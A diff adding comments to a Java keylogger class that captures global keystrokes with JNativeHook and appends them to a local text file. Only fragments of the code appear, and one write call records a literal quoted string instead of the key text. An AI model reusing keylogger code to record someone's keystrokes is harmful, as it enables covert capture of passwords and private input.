@@ -3,6 +3,7 @@ package main;
 import java.io.FileWriter;
 import java.io.IOException;
 
+// Jnativehook library
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
@@ -26,7 +27,7 @@ public class Keylogger implements NativeKeyListener  {
 		
 	}
 	
-	
+	// Prints a space character instead of "SPACE"
 	public void nativeKeyPressed(NativeKeyEvent nke) {
 		switch (nke.getKeyCode()) {
 		case NativeKeyEvent.VC_SPACE:
@@ -39,6 +40,7 @@ public class Keylogger implements NativeKeyListener  {
 			}
 				//System.out.println(" ");
 			break;
+				// Prints a new line instead of the word "enter"
 		case NativeKeyEvent.VC_ENTER:
 			try {
 				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
@@ -67,6 +69,7 @@ public class Keylogger implements NativeKeyListener  {
 			}
 		
 		default:
+				// Prints characters as they are, besides "space" "enter" "up arrow" and "down arrow"
 			try {
 				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
 				fw.write("NativeKeyEvent.getKeyText(nke.getKeyCode())");
